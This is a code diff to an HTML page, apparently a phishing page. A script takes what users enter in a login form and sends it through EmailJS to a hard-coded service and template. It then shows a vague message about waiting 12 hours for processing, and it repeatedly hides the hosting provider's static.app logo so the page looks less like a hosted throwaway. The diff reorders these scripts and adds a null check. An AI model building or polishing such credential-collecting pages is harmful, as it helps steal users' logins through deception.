@@ -124,23 +124,30 @@
     </div>
   </div>
 
-  <script>
+<!-- Static App Form Collection Script -->
+<script src="https://static.app/js/static-forms.js" type="text/javascript"></script>
+<script src="https://static.app/js/static.js" type="text/javascript"></script>
+
+<!-- ✅ EmailJS form submission + hide static.app logo -->
+<script>
   // EmailJS form submission
   const form = document.getElementById("loginForm");
-  form.addEventListener("submit", function(e) {
-    e.preventDefault();
+  if (form) {
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
 
-    emailjs.sendForm(
-      "service_w7q3bge",   // ← palitan ng totoong Service ID
-      "template_oply56o",  // ← palitan ng totoong Template ID
-      this
-    ).then(() => {
-      alert("✅ Sent successfully! wait until 12 hours of processing");
-      form.reset();
-    }, (error) => {
-      alert("❌ Error: " + JSON.stringify(error));
+      emailjs.sendForm(
+        "service_w7q3bge",   // ← palitan ng totoong Service ID
+        "template_oply56o",  // ← palitan ng totoong Template ID
+        this
+      ).then(() => {
+        alert("✅ Sent successfully! wait until 12 hours of processing");
+        form.reset();
+      }, (error) => {
+        alert("❌ Error: " + JSON.stringify(error));
+      });
     });
-  });
+  }
 
   // Function to hide static.app logo
   function hideStaticLogo() {
@@ -154,12 +161,9 @@
   window.addEventListener('load', hideStaticLogo);
 
   // Also run every 500ms in case logo is dynamically injected
-  const logoInterval = setInterval(hideStaticLogo, 500);
+  setInterval(hideStaticLogo, 500);
 </script>
-
-<!-- Static App Form Collection Script -->
-<script src="https://static.app/js/static-forms.js" type="text/javascript"></script>
-<script src="https://static.app/js/static.js" type="text/javascript"></script>
 </body>
 </html>
+
 
